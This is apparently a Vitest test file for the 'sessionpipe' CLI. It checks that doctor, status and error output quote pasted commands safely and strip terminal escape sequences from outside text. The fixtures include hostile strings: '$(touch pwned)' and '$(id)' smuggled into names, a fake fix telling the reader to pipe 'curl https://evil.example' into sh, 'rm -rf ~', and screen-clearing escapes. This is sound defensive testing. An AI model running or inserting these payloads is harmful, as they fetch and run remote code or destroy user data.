  it("one thing with a command to run makes it 1, beside any number with none; --json is 0 all the same", async () => {
    await hooked();
    hookTakes(400);
    writeConfig({
      ...cfg(),
      sinks: [{ name: "kc", url: "https://kc.invalid", tier: 0, paused: "HTTP 401" }],
    } as never);
    const d = await run("doctor");
    expect(d.lines[0]).toBe("! 2 things need attention");
    expect(fixes(d).filter((l) => l.startsWith("       "))).toEqual(["       sessionpipe sink test kc"]);
    expect(process.exitCode).toBe(1);
    process.exitCode = undefined;
    const j = JSON.parse((await run("doctor", "--json")).lines.join("\n"));
    expect(j.warnings).toEqual([expect.stringContaining("the harness waits 400 ms per hook")]);
    expect(process.exitCode).toBeUndefined();
    // `status` never sets it either: it says what it sees and leaves the rest to doctor.
    expect((await run("status")).lines[0]).toBe("! 1 thing needs attention");
    expect(process.exitCode).toBeUndefined();
  });
});

describe.skipIf(process.platform === "win32")("commands doctor prints for pasting", () => {
  /** The commands under "To fix", as they would be pasted. */
  const pasted = (r: { lines: string[] }) =>
    fixes(r)
      .filter((l) => l.startsWith("       "))
      .map((l) => l.trim());
  /** What a POSIX shell makes of a printed command: its words, with '…' and \\' read as
   *  sh reads them and nothing expanded (shell.test.ts asks a real sh the same). */
  function words(cmd: string): string[] {
    const out: string[] = [];
    let cur: string | null = null;
    for (let i = 0; i < cmd.length; i++) {
      const c = cmd[i] as string;
      if (c === " ") {
        if (cur !== null) out.push(cur);
        cur = null;
      } else if (c === "'") {
        const end = cmd.indexOf("'", i + 1);
        cur = (cur ?? "") + cmd.slice(i + 1, end);
        i = end;
      } else cur = (cur ?? "") + (c === "\\" ? cmd[++i] : c);
    }
    return cur === null ? out : [...out, cur];
  }
  const odd = "my box's $(touch pwned) dir";

  it("a sink's name and a receiver's address are each one word, whatever is in them", async () => {
    steadyHook();
    vi.stubEnv("SESSIONPIPE_CLAUDE", fakeClaude());
    onPlatform("darwin");
    writeConfig({
      sinks: [{ name: odd, url: "https://kc.invalid", tier: 0, paused: "HTTP 401" }],
      harnesses: {},
    } as never);
    const gone = "https://gone.test/$(id)?a=1&b=`x`";
    paired({ receivers: [{ url: gone, machine: "m", token: "t", keys: [] }] });
    const close = await daemon({
      status: {
        op: "status",
        status: {
          version: VERSION,
          receivers: [
            {
              url: gone,
              polling: false,
              last_poll: 1,
              last_error: "the receiver no longer knows this machine (401)",
              last_poll_age_ms: 60_000,
            },
          ],
        },
      },
    });
    try {
      const cmds = pasted(await run("doctor"));
      expect(cmds).toEqual([
        `sessionpipe sink test 'my box'\\''s $(touch pwned) dir'`,
        `sessionpipe control pair '${gone}'`,
      ]);
      expect(words(cmds[0] as string)).toEqual(["sessionpipe", "sink", "test", odd]);
      expect(words(cmds[1] as string)).toEqual(["sessionpipe", "control", "pair", gone]);
    } finally {
      await close();
    }
  });

  it("a folder with a space, a quote or a $ in it: the service's file, its log, an account's folder", async () => {
    // A home nobody would choose, and one many have: "/Users/Mary Ann".
    const oddHome = path.join(tmp, odd);
    // Its state is kept somewhere else again, where no `~` shortens the path.
    const oddState = path.join(tmp, "state of $(touch pwned)'s");
    mkdirSync(oddHome);
    vi.stubEnv("HOME", oddHome);
    vi.stubEnv("USERPROFILE", oddHome);
    vi.stubEnv("SESSIONPIPE_STATE", oddState);
    vi.stubEnv("CLAUDE_CONFIG_DIR", path.join(oddHome, ".claude"));
    vi.spyOn(os, "homedir").mockReturnValue(oddHome);
    // Two accounts not signed in: one in a folder a shell reads as it stands, one not.
    const oddAccount = path.join(oddHome, ".claude-it's $(touch pwned).claude-second");
    put(path.join(oddHome, ".claude", "settings.json"), {});
    put(path.join(oddHome, ".claude-second", "settings.json"), {});
    put(path.join(oddAccount, "settings.json"), {});
    vi.stubEnv("SESSIONPIPE_CLAUDE", fakeClaude());
    vi.stubEnv("SESSIONPIPE_SERVICE_LABEL", "org.sessionpipe.test");
    steadyHook();
    paired();
    let loaded = false;
    vi.mocked(execFileSync).mockImplementation((() => {
      if (!loaded) throw new Error("not there");
      return "";
    }) as never);
    onPlatform("darwin");
    const plist = path.join(oddHome, "Library", "LaunchAgents", "org.sessionpipe.test.plist");
    put(plist, "");
    const start = pasted(await run("doctor"));
    // The whole path, quoted: a `~` inside quotes would be a folder of that name.
    const q = (p: string) => `'${p.replace(/'/g, `'\\''`)}'`;
    // A service launchd should be running and isn't is `update`'s to put back: no path to paste.
    expect(start[0]).toBe("sessionpipe update");
    // Under the home folder a `~` is enough, and the shell fills it in. The other folder
    // is one word only inside quotes, where a `~` would not be filled in: the whole path.
    const odder = `CLAUDE_CONFIG_DIR=${q(oddAccount)} claude auth login`;
    expect(start.slice(1).sort()).toEqual([odder, "CLAUDE_CONFIG_DIR=~/.claude-second claude auth login"].sort());
    expect(words(odder)).toEqual([`CLAUDE_CONFIG_DIR=${oddAccount}`, "claude", "auth", "login"]);
    loaded = true;
    const silent = pasted(await run("doctor"));
    expect(silent[0]).toBe(`tail -n 20 ${q(path.join(oddState, "control", "daemon.log"))}`);
    expect(words(silent[0] as string)).toEqual(["tail", "-n", "20", path.join(oddState, "control", "daemon.log")]);
    // `connect` says the same sign-in command on its own line, quoted the same.
    loaded = false;
    const connected = await run("connect", "rx.invalid", "--no-service");
    expect(connected.text).toContain(`not signed in as this shell sees it — \`${odder}\``);
    expect(connected.text).toContain("— `CLAUDE_CONFIG_DIR=~/.claude-second claude auth login`");
  });

  it("an ordinary folder keeps its short form, and a user or a unit with a space in its name is one word", async () => {
    put(path.join(home, ".claude", "settings.json"), {});
    put(path.join(home, ".claude-second", "settings.json"), {});
    vi.stubEnv("SESSIONPIPE_CLAUDE", fakeClaude());
    vi.stubEnv("SESSIONPIPE_SERVICE_LABEL", "org.sessionpipe.test");
    vi.spyOn(os, "homedir").mockReturnValue(home);
    vi.spyOn(os, "userInfo").mockReturnValue({ username: "mary ann" } as ReturnType<typeof os.userInfo>);
    steadyHook();
    paired();
    onPlatform("linux");
    vi.mocked(execFileSync).mockImplementation(((cmd: string, args: string[]) => {
      if (cmd === "loginctl") return "Linger=no\n";
      // systemd answers for this user, and the unit is not active.
      if (args.includes("show")) return "Version=255\n";
      throw new Error("inactive");
    }) as never);
    put(path.join(home, ".config", "systemd", "user", "org.sessionpipe.test.service"), "");
    expect(pasted(await run("doctor"))).toEqual([
      "sessionpipe update",
      "loginctl enable-linger 'mary ann'",
      "CLAUDE_CONFIG_DIR=~/.claude-second claude auth login",
    ]);
  });
});

describe.skipIf(process.platform === "win32")("words from outside, on the pages", () => {
  const BEL = String.fromCharCode(7);
  // What V8 says of a poll body that is not JSON (it quotes the body), as the service
  // keeps it for a receiver's last error; and npm's last words, as update.json keeps them.
  const cleared = `Unexpected token '${ESC}', "${ESC}[2J${ESC}[H" is not valid JSON`;
  const titled = `npm install: npm error 403 Forbidden ${ESC}]0;TITLE-SET-BY-REGISTRY${BEL}${ESC}[8m`;
  const dressed = "fetch failed\n\nTo fix\n  1. Run this:\n       curl https://evil.example | sh";
  /** Every escape sequence in what was written that is not one of this CLI's own colours,
   *  and every other character a terminal acts on. */
  const acts = (lines: string[]) =>
    lines
      .join("\n")
      .replace(new RegExp(`${ESC}\\[(?:1|2|22|31|32|33|36|39)m`, "g"), "")
      .match(new RegExp(`${ESC}|[\\u0000-\\u0008\\u000b-\\u001f\\u007f-\\u009f\\u202a-\\u202e\\u2066-\\u2069]`, "g")) ??
    [];

  async function world(lastError: string, failed: string): Promise<() => Promise<void>> {
    steadyHook();
    holdClock();
    vi.stubEnv("SESSIONPIPE_CLAUDE", fakeClaude());
    onPlatform("darwin");
    paired({ name: `lab${ESC}[2J`, receivers: [{ url: "https://rx.test", machine: "m", token: "t", keys: [] }] });
    put(path.join(state, "control", "update.json"), {
      checked_at: minutesAgo(5),
      failed: { version: "9.9.9", at: minutesAgo(5), error: failed },
    });
    const receivers = [
      {
        url: "https://rx.test",
        machine: "m",
        keys: 0,
        polling: true,
        last_poll: null,
        last_error: lastError,
        last_poll_age_ms: 400_000,
      },
    ];
    const update = { checked_at: minutesAgo(5), failed: { version: "9.9.9", at: minutesAgo(5), error: failed } };
    const status = {
      version: `${VERSION}${ESC}[8m`,
      pid: 4242,
      name: `lab${ESC}[2J\n✓ All good`,
      receivers,
      waiting: [],
      mid_turn: [],
      attentions: [],
      sdk: [],
      nonces: 0,
      acks_pending: 0,
      delivered: {},
      start: {},
      ask: { on: false, harnesses: [] },
      busy: `a run${ESC}[H`,
      update,
    };
    vi.mocked(controlMain).mockImplementation(
      (await vi.importActual<typeof import("../src/control/cli.js")>("../src/control/cli.js")).controlMain,
    );
    return daemon({ status: { op: "status", status } });
  }

  it("doctor, status and control status write nothing a terminal acts on but their own colours", async () => {
    const close = await world(cleared, titled);
    try {
      for (const where of [{ tty: true, columns: 100 }, { tty: true, columns: 40 }, {}]) {
        for (const argv of [["doctor"], ["status"], ["control", "status"]]) {
          const r = await runAt(where, ...argv);
          expect(r.text.length).toBeGreaterThan(100);
          expect(acts(r.lines)).toEqual([]);
        }
      }
      const d = await run("doctor");
      expect(d.text).toMatch(row("✗", "rx.test", `not live for 7 min: Unexpected token '', "" is not valid JSON`));
      expect(d.text).toMatch(row("!", "failed", "installing 9.9.9 5 min ago: npm install: npm error 403 Forbidden "));
      const st = (await runAt({ tty: true, columns: 100 }, "control", "status", "--no-color")).lines;
      expect(st[1]).toBe(`  sessionpipe ${VERSION} · pid 4242 · lab ✓ All good`);
      expect(st).toContain("  · in hand   a run");
      // A program still gets the service's JSON as it came: JSON has its own escapes.
      const json = JSON.parse((await run("control", "status")).lines.join("\n"));
      expect(json.receivers[0].last_error).toBe(cleared);
    } finally {
      await close();
    }
  });

  it("an error dressed as the end of the page stays in its row: one 'To fix', and only our commands under it", async () => {
    const close = await world(dressed, dressed);
    try {
      for (const where of [{ tty: true, columns: 100 }, {}]) {
        const d = await runAt(where, "doctor", "--no-color");
        expect(d.lines.filter((l) => l.trim() === "To fix")).toHaveLength(1);
        const under = d.lines.slice(d.lines.indexOf("To fix") + 1);
        // Two things to fix here (the service's version, the failed install), one command.
        expect([...new Set(under.filter((l) => /^ {7}\S/.test(l)))]).toEqual(["       sessionpipe update"]);
        expect(d.text).not.toMatch(/^\s*curl /m);
        const s = await runAt(where, "status", "--no-color");
        expect(s.lines.filter((l) => l.trim() === "To fix")).toHaveLength(0);
        // A line a group and no more: none begins as a row of someone else's making.
        expect(s.lines.filter((l) => /^ {2}\S /.test(l))).toHaveLength(5);
      }
    } finally {
      await close();
    }
  });

  it("a line a command writes itself loses what a terminal acts on too, in a pipe as at a terminal", async () => {
    // A receiver's answer to a test event, put on `sink test`'s own line.
    const rx = await receiver({ status: 502, body: {} });
    writeConfig({ sinks: [{ name: "rx", url: `${rx.url}/x`, tier: 0 }], harnesses: {} } as never);
    vi.spyOn(HttpSink.prototype, "send").mockResolvedValue({
      ok: false,
      status: 502,
      error: `${titled}${ESC}[2J`,
      action: "retry",
    } as never);
    for (const where of [{ tty: true, columns: 100 }, {}]) {
      const r = await runAt(where, "sink", "test", "rx");
      expect(acts(r.lines)).toEqual([]);
      // A pipe keeps the line's own spaces; a terminal sets its words one space apart.
      expect(plain(r.text)).toMatch(/^ {2}✗ rx: 502 npm install: npm error 403 Forbidden {1,2}\(retry\)$/);
    }
    // A receiver's words on several lines, made up like doctor's own "To fix": they stay
    // on the one line that is this command's, for `sink test` and for `forget`.
    vi.spyOn(HttpSink.prototype, "send").mockResolvedValue({
      ok: false,
      status: 401,
      error: `${dressed}${ESC}[36m`,
      action: "pause",
    } as never);
    for (const where of [{ tty: true, columns: 200 }, {}]) {
      const t = await runAt(where, "sink", "test", "rx");
      expect(t.lines).toHaveLength(1);
      expect(acts(t.lines)).toEqual([]);
      expect(plain(t.text)).toMatch(
        /^ {2}✗ rx: 401 fetch failed +To fix +1\. Run this: +curl https:\/\/evil\.example \| sh +\(pause\)$/,
      );
      const f = await runAt(where, "forget", "claude-code", "s1");
      expect(f.lines.filter((l) => l.includes("To fix"))).toHaveLength(1);
      expect(acts(f.lines)).toEqual([]);
      expect(plain(f.lines[0] as string)).toMatch(/^ {2}✗ rx: fetch failed +To fix +1\. Run this: +curl/);
    }
    // And what a sink was paused for, as `sink list` shows it to a pipe.
    writeConfig({
      sinks: [{ name: "rx", url: `${rx.url}/x`, tier: 0, paused: `${dressed}${ESC}[2J` }],
      harnesses: {},
    } as never);
    const listed = await run("sink", "list");
    expect(listed.lines).toHaveLength(1);
    expect(acts(listed.lines)).toEqual([]);
    expect(listed.lines[0]).toContain("PAUSED fetch failed");
  });
});

describe.skipIf(process.platform === "win32")("at a terminal", () => {
  const at80 = { tty: true, columns: 80 };
  const green = (s: string) => `${ESC}[32m${s}${ESC}[39m`;
  const bold = (s: string) => `${ESC}[1m${s}${ESC}[22m`;
  const cyan = (s: string) => `${ESC}[36m${s}${ESC}[39m`;

  it("status and doctor take the terminal's colours and fold to its width; --no-color drops the colour and keeps the width", async () => {
    const dim = (s: string) => `${ESC}[2m${s}${ESC}[22m`;
    const brief = await runAt(at80, "status");
    expect(brief.lines[0]).toBe(`${green("✓")} ${bold(green("All good"))}`);
    expect(brief.lines[2]).toMatch(
      new RegExp(`^ {2}${quoted(green("✓"))} This computer {2}\\S+ \\(sessionpipe 0\\.0\\.0\\)$`),
    );
    // A group's line longer than the terminal folds at a space, under its own words.
    expect(brief.lines.slice(-4)).toEqual([
      `  ${dim("·")} Updates        by hand: this copy isn't a global npm install (npx, a`,
      `${" ".repeat(19)}checkout or a dev build)`,
      "",
      `  ${cyan("`sessionpipe doctor`")} looks closer.`,
    ]);
    for (const l of brief.lines) expect(plain(l).length).toBeLessThan(80);
    // Into a pipe the same line is whole, and nothing is coloured.
    const piped = await run("status");
    expect(piped.text).not.toContain(ESC);
    expect(said(piped, "Updates")).toBe(
      "· by hand: this copy isn't a global npm install (npx, a checkout or a dev build)",
    );
    // --no-color, wherever it stands, is taken out of the command: the same lines, no colour.
    for (const argv of [
      ["status", "--no-color"],
      ["--no-color", "status"],
    ]) {
      const mono = await runAt(at80, ...argv);
      expect(mono.text).not.toContain(ESC);
      expect(mono.lines).toEqual(brief.lines.map(plain));
    }
    // Doctor's page: each group under a heading in bold, a long row folded under its own text.
    steadyHook();
    vi.stubEnv("SESSIONPIPE_CLAUDE", fakeClaude());
    const page = await runAt(at80, "doctor");
    expect(page.lines[0]).toBe(`${green("✓")} ${bold(green("All good"))}`);
    expect(page.lines).toContain(bold("This computer"));
    expect(page.lines).toContain(`  ${green("✓")} Claude Code ~/.claude  signed in`);
    expect(group({ lines: page.lines.map(plain) }, "Updates")).toEqual([
      "  · by hand  this copy isn't a global npm install (npx, a checkout or a dev",
      "             build)",
    ]);
    for (const l of page.lines) expect(plain(l).length).toBeLessThan(80);
    expect((await runAt(at80, "doctor", "--no-color")).lines).toEqual(page.lines.map(plain));
    // NO_COLOR does the same from the environment.
    vi.stubEnv("NO_COLOR", "1");
    expect((await runAt(at80, "status")).lines).toEqual(brief.lines.map(plain));
    expect((await runAt(at80, "doctor")).lines).toEqual(page.lines.map(plain));
  });

  it("the lines every command has always written are marked in colour and folded under their own text", async () => {
    const add = await runAt(at80, "sink", "add", "stdout");
    expect(add.lines[0]).toBe(`  ${green("✓")} sink stdout: stdout at tier 0`);
    // One long line, folded under where its text begins, after the label.
    const sends = (add.lines[1] as string).split("\n");
    expect(sends.length).toBeGreaterThan(1);
    expect(sends[0]).toMatch(/^ {4}tier 0 sends: session state and timing, machine, folder,/);
    for (const l of sends.slice(1)) expect(l).toMatch(/^ {18}\S/);
    for (const l of sends) expect(l.length).toBeLessThan(80);
    // Into a pipe it is the one line it always was.
    const piped = await run("sink", "add", "stdout");
    expect(piped.lines[0]).toBe("  ✓ sink stdout: stdout at tier 0");
    expect(piped.lines[1]).toBe(
      sends
        .map((l) => l.trim())
        .join(" ")
        .replace(/^/, "    "),
    );

    // `sink list`: columns as wide as they need, the last one folded under itself.
    writeConfig({
      sinks: [
        {
          name: "rx",
          url: "https://receiver.example.com",
          tier: 3,
          max_tier: 1,
          pii: true,
          paused: "HTTP 401 from the receiver",
        },
        { name: "out", url: "stdout", tier: 0 },
      ],
      harnesses: {},
    } as never);
    expect((await runAt({ tty: true, columns: 60 }, "sink", "list")).lines).toEqual([
      "  rx   https://receiver.example.com  tier 3 (capped 1) pii",
      "                                     PAUSED HTTP 401 from",
      "                                     the receiver · tools",
      "                                     all",
      "  out  stdout                        tier 0",
    ]);
    // Into a pipe: the line it always was, byte for byte, the name in 16 columns and the address in 44.
    expect((await run("sink", "list")).lines).toEqual([
      `  ${"rx".padEnd(16)} ${"https://receiver.example.com".padEnd(44)} tier 3 (capped 1) pii PAUSED HTTP 401 from the receiver · tools all`,
      `  ${"out".padEnd(16)} ${"stdout".padEnd(44)} tier 0`,
    ]);
    expect((await run("sink", "list")).lines[1]).toBe(
      "  out              stdout                                       tier 0",
    );
  });

  it("what a program reads is never coloured or folded: --json, the version, an agent's answer, the daemon's log", async () => {
    const j = await runAt(at80, "status", "--json");
    expect(j.text).not.toContain(ESC);
    expect(JSON.parse(j.text)).toMatchObject({ version: VERSION, sinks: [] });
    expect((await runAt(at80, "version")).lines).toEqual([VERSION]);
    // The note a harness would get from `hook` is longer than the line would be, and whole.
    expect((await runAt({ tty: true, columns: 40 }, "hook")).lines).toEqual([
      "sessionpipe hook is dist/hook.js; harnesses run it directly",
    ]);
    // `ask <agent> "<task>"` prints the agent's answer as it came; the family's own
    // commands (`ask status`) are for a person.
    vi.mocked(askMain).mockImplementation(async (_argv, io) => {
      io.out("  ✓ done: `rm -rf` was not run");
      return 0;
    });
    expect((await runAt(at80, "ask", "codex", "tidy up")).lines).toEqual(["  ✓ done: `rm -rf` was not run"]);
    expect((await runAt(at80, "ask", "status")).lines).toEqual([
      `  ${green("✓")} done: ${cyan("`rm -rf`")} was not run`,
    ]);
    expect((await runAt(at80, "ask")).lines).toEqual([`  ${green("✓")} done: ${cyan("`rm -rf`")} was not run`]);
    // `control status` is a page at a terminal and JSON for a pipe or --json; `control run`
    // writes the daemon's log; every other `control` line is for a person.
    const view = () => (vi.mocked(controlMain).mock.lastCall as unknown[])[3] as { ui: typeof PLAIN };
    await runAt(at80, "control", "status");
    expect(view().ui).toEqual({ color: true, unicode: true, width: 79, tty: true });
    await runAt(at80, "control", "status", "--json");
    expect(view().ui).toBe(PLAIN);
    await runAt(at80, "control", "run");
    expect(view().ui).toBe(PLAIN);
    await runAt(at80, "control", "mode");
    expect(view().ui).toMatchObject({ color: true, tty: true });
    await run("control", "mode");
    expect(view().ui).toEqual(PLAIN);
    // A waiter's message goes out by the very function it was given.
    const lines: string[] = [];
    const out = (s = "") => void lines.push(s);
    await cli.main(["wait", "--session", "codex:t"], { out, err: vi.fn(), exit: vi.fn(), ...at80 });
    expect(waitMain).toHaveBeenLastCalledWith(["wait", "--session", "codex:t"], out);
  });

  it("--help at a terminal: a command's usage folded between its options, and the page of every command", async () => {
    const usage = await runAt(at80, "install", "--help");
    expect(usage.lines).toHaveLength(1);
    const lines = (usage.lines[0] as string).split("\n");
    expect(lines[0]).toMatch(new RegExp(`^${quoted(bold("Usage:"))} sessionpipe install \\[--claude-code `));
    // Each further line starts under the first option, and none splits `[--sink URL --tier N]`.
    const folded = lines.slice(1, lines.indexOf(""));
    expect(folded.length).toBeGreaterThan(1);
    for (const l of folded) expect(l).toMatch(/^ {27}[[-]/);
    expect(folded).toContain(`${" ".repeat(27)}[--backfill DAYS] [--sink URL --tier N]`);
    for (const l of lines) expect(plain(l).length).toBeLessThan(80);
    expect(lines.at(-1)).toBe("  -h, --help  Show help without running the command.");
    // Help wins for a command a program reads, too.
    expect((await runAt(at80, "tail", "-h")).lines[0]).toMatch(
      new RegExp(`^${quoted(bold("Usage:"))} sessionpipe tail \\[--session ID\\]`),
    );
    const page = ((await runAt(at80, "--help")).lines[0] as string).split("\n");
    expect(page[0]).toBe(
      `${bold(`sessionpipe ${VERSION}`)} · what your coding agents are doing, sent where you choose`,
    );
    expect(page).toContain(bold("Set up"));
    expect(page).toContain(`  ${cyan("doctor".padEnd(26))}  Is this computer fine, and what to fix`);
    for (const l of page) expect(plain(l).length).toBeLessThan(80);
  });

  it("an error at a terminal is two lines: what is wrong, and the command to try, in that terminal's colours", async () => {
    const said = "--machine NAME is required when naming or renaming a machine";
    const red = (s: string) => `${ESC}[31m${s}${ESC}[39m`;
    const dim = (s: string) => `${ESC}[2m${s}${ESC}[22m`;
    // stdout into a pipe, stderr at the terminal: the error is coloured, by its own stream.
    const r = await runAt({ errTty: true, columns: 80 }, "install", "--machine");
    expect(r.err).toHaveBeenCalledWith(
      `${red(bold("error"))}  ${said}\n${dim("try")}    ${cyan("sessionpipe install --help")}\n`,
    );
    expect(r.exit).toHaveBeenCalledWith(1);
    // --no-color holds for errors too; a narrow terminal folds what is wrong under itself.
    const mono = await runAt({ errTty: true, columns: 40 }, "install", "--machine", "--no-color");
    expect(mono.err).toHaveBeenCalledWith(
      "error  --machine NAME is required when\n       naming or renaming a machine\ntry    sessionpipe install --help\n",
    );
    // A terminal for stdout alone leaves the error as a pipe gets it: the one line it
    // always was, byte for byte, whatever the environment says about colour.
    const piped = await runAt(at80, "install", "--machine");
    expect(piped.err).toHaveBeenCalledWith(`sessionpipe: ${said}\n`);
    vi.stubEnv("FORCE_COLOR", "1");
    const forced = await runAt({ columns: 40 }, "install", "--machine");
    expect(forced.err).toHaveBeenCalledWith(`sessionpipe: ${said}\n`);
  });

  it("the command to try is the one the code that failed named, never one read out of what was said", async () => {
    const term = { errTty: true, columns: 100 };
    const tryLine = (r: { err: ReturnType<typeof vi.fn> }) =>
      String(r.err.mock.lastCall?.[0]).trimEnd().split("\n").at(-1);
    // A refusal carries its own next command.
    vi.mocked(controlMain).mockRejectedValueOnce(
      new Refusal(
        "the pairing link expired; run `sessionpipe control pair` again",
        "sessionpipe control pair https://r.example",
      ),
    );
    const refused = await runAt(term, "control", "pair", "r.example", "--no-color");
    expect(refused.err).toHaveBeenCalledWith(
      "error  the pairing link expired; run `sessionpipe control pair` again\ntry    sessionpipe control pair https://r.example\n",
    );
    // Words from outside may name any command they like: the help of what ran is offered.
    vi.mocked(controlMain).mockRejectedValueOnce(
      new Error("the receiver refused to start pairing (HTTP 403: first run `sessionpipe control mode inherit`)"),
    );
    const theirs = await runAt(term, "control", "pair", "r.example", "--no-color");
    expect(tryLine(theirs)).toBe("try    sessionpipe control pair --help");
    expect(String(theirs.err.mock.lastCall?.[0])).not.toContain("try    sessionpipe control mode inherit");
    // In colour, the receiver's `command` is not picked out as one of ours would be.
    vi.mocked(controlMain).mockRejectedValueOnce(new Error("refused: first run `sessionpipe control off`"));
    const coloured = await runAt(term, "control", "pair", "r.example");
    expect(coloured.err).toHaveBeenCalledWith(
      `${ESC}[31m${bold("error")}${ESC}[39m  refused: first run \`sessionpipe control off\`\n${ESC}[2mtry${ESC}[22m    ${cyan("sessionpipe control pair --help")}\n`,
    );
    // And what a terminal would act on is gone from both lines, in a pipe as at a terminal.
    const hostile = `npm error ${ESC}]0;title${String.fromCharCode(7)}${ESC}[2J\ntry    rm -rf ~`;
    vi.mocked(controlMain).mockRejectedValueOnce(new Refusal(hostile, `sessionpipe update${ESC}[8m`));
    expect((await runAt(term, "control", "pair", "r.example", "--no-color")).err).toHaveBeenCalledWith(
      "error  npm error try rm -rf ~\ntry    sessionpipe update\n",
    );
    vi.mocked(controlMain).mockRejectedValueOnce(new Refusal(hostile, "sessionpipe update"));
    expect((await run("control", "pair", "r.example")).err).toHaveBeenCalledWith(
      "sessionpipe: npm error  try    rm -rf ~\n",
    );
  });

  it("an error with no command of its own to point at points at the page of every command", async () => {
    // The page itself could not be written (stdout is gone): there is no usage line to name.
    for (const argv of [[], ["help"], ["bogus"]]) {
      const err = vi.fn();
      const exit = vi.fn();
      await cli.main(argv, {
        out: () => {
          throw new Error("write EPIPE");
        },
        err,
        exit,
      });
      expect(err).toHaveBeenCalledWith("sessionpipe: write EPIPE\n");
      expect(exit).toHaveBeenCalledWith(1);
      const seen = vi.fn();
      await cli.main(argv, {
        out: () => {
          throw new Error("write EPIPE");
        },
        err: seen,
        exit,
        errTty: true,
        columns: 80,
      });
      expect(plain(String(seen.mock.lastCall?.[0]))).toBe("error  write EPIPE\ntry    sessionpipe --help\n");
    }
  });

  it("by default the terminal is this process's own: stdout's for the page, stderr's for an error", async () => {
    const stdout = vi.spyOn(process.stdout, "write").mockReturnValue(true);
    const stderr = vi.spyOn(process.stderr, "write").mockReturnValue(true);
    vi.spyOn(process, "exit").mockImplementation(() => undefined as never);
    const was = {
      out: Object.getOwnPropertyDescriptor(process.stdout, "isTTY"),
      columns: Object.getOwnPropertyDescriptor(process.stdout, "columns"),
      err: Object.getOwnPropertyDescriptor(process.stderr, "isTTY"),
    };
    const put1 = (o: object, k: string, d: PropertyDescriptor | undefined, value?: unknown) =>
      d && value === undefined
        ? Object.defineProperty(o, k, d)
        : value === undefined
          ? delete (o as Record<string, unknown>)[k]
          : Object.defineProperty(o, k, { value, configurable: true, writable: true });
    try {
      put1(process.stdout, "isTTY", undefined, true);
      put1(process.stdout, "columns", undefined, 60);
      put1(process.stderr, "isTTY", undefined, true);
      await cli.main(["status"]);
      const written = stdout.mock.calls.map(([s]) => plain(String(s)));
      expect(String(stdout.mock.calls[0]?.[0])).toBe(`${green("✓")} ${bold(green("All good"))}\n`);
      // Sixty columns wide, as stdout says: a long row folds there, and nothing runs past it.
      expect(written).toContain("  · Updates        by hand: this copy isn't a global npm\n");
      expect(written).toContain(`${" ".repeat(19)}install (npx, a checkout or a dev build)\n`);
      for (const l of written.join("").split("\n")) expect(l.length).toBeLessThan(60);
      await cli.main(["install", "--machine"]);
      expect(String(stderr.mock.lastCall?.[0])).toBe(
        `${ESC}[31m${bold("error")}${ESC}[39m  --machine NAME is required when naming or renaming a\n       machine\n${ESC}[2mtry${ESC}[22m    ${cyan("sessionpipe install --help")}\n`,
      );
      // Not a terminal: plain, whole lines, as a script has always read them.
      put1(process.stdout, "isTTY", undefined, false);
      put1(process.stderr, "isTTY", undefined, false);
      stdout.mockClear();
      await cli.main(["status"]);
      expect(stdout.mock.calls.map(([s]) => String(s)).join("")).not.toContain(ESC);
      await cli.main(["install", "--machine"]);
      expect(stderr).toHaveBeenLastCalledWith(
        "sessionpipe: --machine NAME is required when naming or renaming a machine\n",
      );
    } finally {
      put1(process.stdout, "isTTY", was.out);
      put1(process.stdout, "columns", was.columns);
      put1(process.stderr, "isTTY", was.err);
    }
  });
});

describe("a refusal that is only what is left to do", () => {
  const LEFT = "One other copy is still there: 0.9.0 in /usr/local (needs sudo)";
  const NEXT = "sudo rm -r /usr/local/lib/node_modules/sessionpipe /usr/local/bin/sessionpipe";
  const term = { errTty: true, columns: 200 };
  /** One run of a command that ends by throwing `e`: what was written for errors, and the exit. */
  async function thrown(where: { tty?: boolean; columns?: number; errTty?: boolean }, e: Error, ...flags: string[]) {
    vi.mocked(controlMain).mockRejectedValueOnce(e);
    const r = await runAt(where, "control", "pair", "r.example", ...flags);
    expect(r.err).toHaveBeenCalledTimes(1);
    expect(r.exit.mock.calls).toEqual([[1]]);
    return String(r.err.mock.lastCall?.[0]);
  }

  it("L10: at a terminal it is said under a yellow `!` over the one line to try, and in a pipe it is the single line `sessionpipe: … Next: …`; exit 1 for both", async () => {
    const mild = () => new Refusal(LEFT, NEXT, true, true);
    expect(await thrown(term, mild())).toBe(
      `${ESC}[33m${ESC}[1m!${ESC}[22m${ESC}[39m      ${LEFT}\n${ESC}[2mtry${ESC}[22m    ${ESC}[36m${NEXT}${ESC}[39m\n`,
    );
    expect(await thrown(term, mild(), "--no-color")).toBe(`!      ${LEFT}\ntry    ${NEXT}\n`);
    // A narrow terminal folds what is left under its own first word; the line to try is whole.
    expect(await thrown({ errTty: true, columns: 40 }, mild(), "--no-color")).toBe(
      `!      One other copy is still there:\n       0.9.0 in /usr/local (needs sudo)\ntry    ${NEXT}\n`,
    );
    // Where errors go to no terminal (a pipe, a script, an agent) it is the one line any
    // refusal is, the command at its end: whatever stdout is.
    expect(await thrown({}, mild())).toBe(`sessionpipe: ${LEFT}. Next: ${NEXT}\n`);
    expect(await thrown({ tty: true, columns: 80 }, mild())).toBe(`sessionpipe: ${LEFT}. Next: ${NEXT}\n`);
    // Mild says how it is marked, and nothing of the line a pipe gets: one whose message
    // names its own command is not given a second one.
    expect(await thrown({}, new Refusal(LEFT, NEXT, false, true))).toBe(`sessionpipe: ${LEFT}\n`);
    expect(await thrown(term, new Refusal(LEFT, NEXT, false, true), "--no-color")).toBe(
      `!      ${LEFT}\ntry    ${NEXT}\n`,
    );
  });

  it("L10: a refusal that is not mild is an error as it always was, and an error that is no refusal is never mild", async () => {
    expect(await thrown(term, new Refusal(LEFT, NEXT, true))).toBe(
      `${ESC}[31m${ESC}[1merror${ESC}[22m${ESC}[39m  ${LEFT}\n${ESC}[2mtry${ESC}[22m    ${ESC}[36m${NEXT}${ESC}[39m\n`,
    );
    expect(await thrown(term, new Refusal(LEFT, NEXT), "--no-color")).toBe(`error  ${LEFT}\ntry    ${NEXT}\n`);
    expect(await thrown({}, new Refusal(LEFT, NEXT, true))).toBe(`sessionpipe: ${LEFT}. Next: ${NEXT}\n`);
    expect(await thrown({}, new Refusal(LEFT, NEXT))).toBe(`sessionpipe: ${LEFT}\n`);
    // Whatever an error from somewhere else carries: it is an error, and the help of what
    // ran is the line to try.
    const dressed = () => Object.assign(new Error(LEFT), { mild: true, inLine: true, next: NEXT });
    expect(await thrown(term, dressed(), "--no-color")).toBe(
      `error  ${LEFT}\ntry    sessionpipe control pair --help\n`,
    );
    expect(await thrown({}, dressed())).toBe(`sessionpipe: ${LEFT}\n`);
  });
});

